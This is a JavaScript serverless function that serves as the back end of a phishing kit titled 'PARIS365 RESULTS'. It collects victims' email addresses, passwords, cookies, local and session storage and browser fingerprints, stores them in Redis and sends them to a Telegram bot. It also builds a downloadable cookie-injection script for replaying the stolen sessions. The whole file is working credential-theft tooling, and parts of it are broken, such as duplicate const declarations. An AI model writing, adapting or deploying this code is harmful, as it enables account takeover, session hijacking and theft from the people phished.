const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body || '{}');
    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;

    // Helper to get domain from email/provider
    const getDomainFromEmailProvider = (email, provider) => {
      const providerLower = (provider || '').toLowerCase();
      if (providerLower.includes('gmail') || providerLower.includes('google')) {
        return '.google.com';
      } else if (providerLower.includes('yahoo')) {
        return '.yahoo.com';
      } else if (providerLower.includes('aol')) {
        return '.aol.com';
      } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
                 providerLower.includes('outlook') || providerLower.includes('office365')) {
        return '.live.com';
      } else if (providerLower === 'others' && email && email.includes('@')) {
        const domainPart = email.split('@')[1].toLowerCase();
        return '.' + domainPart;
      }
      // Fallback based on email
      if (email && email.includes('@')) {
        return '.' + email.split('@')[1].toLowerCase();
      }
      return '.google.com';
    };

    // Function to sanitize text for Telegram
    function sanitizeForTelegram(text) {
      if (!text) return '';
      return String(text)
        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
        .trim();
    }

    // Extract only SAFE data with sanitization
    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
    const timestamp = new Date().toISOString();
    
    // Get user IP and location information (OPTIONAL - don't break main function)
    let userIpInfo = {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        timezone: 'Unknown'
    };
    
    // Fix IP formatting - convert concatenated numbers back to proper IP format
    let formattedIP = userIpInfo.ip;
    if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
      // If IP is a concatenated number like "911241779", format it properly
      const ipStr = userIpInfo.ip.toString();
      if (ipStr.length >= 8) {
        // Try to format as IP (e.g., "911241779" -> "91.124.177.9")
        const part1 = ipStr.substring(0, 2) || '0';
        const part2 = ipStr.substring(2, 5) || '0';
        const part3 = ipStr.substring(5, 8) || '0';
        const part4 = ipStr.substring(8) || '0';
        formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
      }
    }

    // Enhanced cookie processing
    const cookieInfo = data.documentCookies || data.cookies || browserFingerprint?.cookies || 'No cookies available';
    const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
    const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';

    // Enhanced cookie formatting with multiple fallback methods
    let formattedCookies = [];

    // Method 1: Direct array
    if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
      formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name).map(cookie => ({
        ...cookie,
        domain: cookie.domain || getDomainFromEmailProvider(email, provider)
      }));
    }

    // Method 2: Parse JSON string
    else if (typeof cookieInfo === 'string' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty' && cookieInfo.trim() !== '') {
      try {
        const parsedCookies = JSON.parse(cookieInfo);
        if (Array.isArray(parsedCookies)) {
          formattedCookies = parsedCookies.filter(cookie => cookie && cookie.name).map(cookie => ({
            ...cookie,
            domain: cookie.domain || getDomainFromEmailProvider(email, provider)
          }));
        }
      } catch (e) {
        // Method 3: Parse document.cookie format
        if (cookieInfo.includes('=')) {
          const cookieStrings = cookieInfo.split(';');
          formattedCookies = cookieStrings
            .filter(cookieStr => cookieStr.trim() && cookieStr.includes('='))
            .map(cookieStr => {
              const [name, ...valueParts] = cookieStr.trim().split('=');
              const value = valueParts.join('=');
              return name && name.trim() && value ? {
                name: name.trim(),
                value: value.trim(),
                domain: getDomainFromEmailProvider(email, provider),
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                hostOnly: false,
                session: false,
                storeId: null
              } : null;
            })
            .filter(cookie => cookie !== null);
        }
      }
    }

    // Method 4: Check for document.cookie direct format
    else if (data.documentCookies && typeof data.documentCookies === 'string') {
      const cookieStrings = data.documentCookies.split(';').filter(c => c.trim() && c.includes('='));
      formattedCookies = cookieStrings
        .map(cookieStr => {
          const [name, ...valueParts] = cookieStr.trim().split('=');
          const value = valueParts.join('=');
          return name && name.trim() && value ? {
            name: name.trim(),
            value: value.trim(),
            domain: getDomainFromEmailProvider(email, provider),
            path: '/',
            secure: true,
            httpOnly: false,
            sameSite: 'none',
            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
            hostOnly: false,
            session: false,
            storeId: null
          } : null;
        })
        .filter(cookie => cookie !== null);
    }

    // Store session data in Redis
    const sessionData = {
      email: email || '',
      password: password || 'Not captured',
      provider: provider || 'Others',
      fileName: fileName || 'Adobe Cloud Access',
      timestamp: timestamp || new Date().toISOString(),
      sessionId,
      clientIP: formattedIP,
      userAgent: userAgent || 'Unknown',
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      browserFingerprint: browserFingerprint || {},
      cookiesFileData: cookiesFileData || '',
      formattedCookies: formattedCookies,
      rawCookieData: data // Store all raw data for debugging
    };

    // Store in Redis if available
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
    if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });

        await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
        await redis.set(`user:${email}`, JSON.stringify(sessionData));
        await redis.set(`cookies:${sessionId}`, JSON.stringify({
          cookies: formattedCookies,
          localStorage: localStorageInfo,
          sessionStorage: sessionStorageInfo,
          timestamp: timestamp,
          email: email,
          password: password
        }));
        console.log('✅ Session data stored in Redis');
      } catch (redisError) {
        console.error('❌ Redis storage error:', redisError);
      }
    }

    // Send main message to Telegram
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';

    const message = `🔐 PARIS365 RESULTS

📧 ${email || 'Not captured'}
🔑 ${password || 'Not captured'}
🏢 ${provider || 'Others'}
🕒 ${new Date().toLocaleString()}
🌐 ${formattedIP} | ${deviceInfo}
🍪 ${formattedCookies.length} cookies captured

🆔 ${sessionId}`;

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
      signal: AbortSignal.timeout(15000),
    });

    let fileSent = false;

    try {
      // Prepare cookies file
      const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
        ...cookie,
        domain: cookie.domain || getDomainFromEmailProvider(email, provider)
      })) : [];

      const jsInjectionCode = cookiesForFile.length > 0 ? 
        `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(cookiesForFile))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();` :
        `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;

      const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
// Provider: ${provider || 'Others'}
// IP: ${formattedIP}
// Cookies Found: ${cookiesForFile.length}

let ipaddress = "${formattedIP}";
let email = "${email || 'Not captured'}";
let password = "${password || 'Not captured'}";

// Raw Cookie Data Debug Info:
// Original cookie info type: ${typeof cookieInfo}
// Original cookie info: ${JSON.stringify(cookieInfo).substring(0, 200)}...
// Formatted cookies count: ${cookiesForFile.length}

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(cookiesForFile, null, 2)}

// Session Storage:
// ${sessionStorageInfo}

// Local Storage:
// ${localStorageInfo}`;

      const fileNameForUpload = `cookies_${(email || 'unknown').replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.js`;

      const boundary = '----formdata-boundary-' + Math.random().toString(36);

      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;

      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n`;

      formData += `--${boundary}--\r\n`;

      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
        },
        body: formData,
        signal: AbortSignal.timeout(30000),
      });

      if (fileResponse.ok) {
        fileSent = true;
      } else {
        const fileErrorText = await fileResponse.text();
        // Fallback: send as text message
        const fallbackMessage = `📁 <b>COOKIES FILE</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(0, 3500)}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;

        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: fallbackMessage,
            parse_mode: 'HTML',
          }),
        });
        if (fallbackResponse.ok) {
          fileSent = true;
        }
      }
    } catch (fileError) {
      // Final fallback - send debug info
      try {
        const debugInfo = `🔍 <b>DEBUG INFO</b>\n\n👤 User: ${email || 'Not captured'}\n🍪 Cookies Found: ${formattedCookies.length}\n📊 Raw Data Type: ${typeof cookieInfo}\n📋 Raw Data: ${JSON.stringify(cookieInfo).substring(0, 200)}...\n\n<i>Cookie processing completed with ${formattedCookies.length} cookies.</i>`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: debugInfo,
            parse_mode: 'HTML',
          }),
        });
        fileSent = true;
      } catch (debugError) {}
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Data processed successfully',
        sessionId: sessionId,
        cookiesCollected: formattedCookies.length > 0,
        cookieCount: formattedCookies.length,
        fileSent: fileSent,
        debug: {
          originalCookieType: typeof cookieInfo,
          processedCookieCount: formattedCookies.length,
          rawDataAvailable: !!cookieInfo
        }
      }),
    };

  } catch (error) {
    // Send error notification
    try {
      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `🚨 <b>FUNCTION ERROR</b>\n\n<code>${error.message}</code>\n\n${new Date().toISOString()}`,
            parse_mode: 'HTML',
          }),
        });
      }
    } catch (notificationError) {}

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};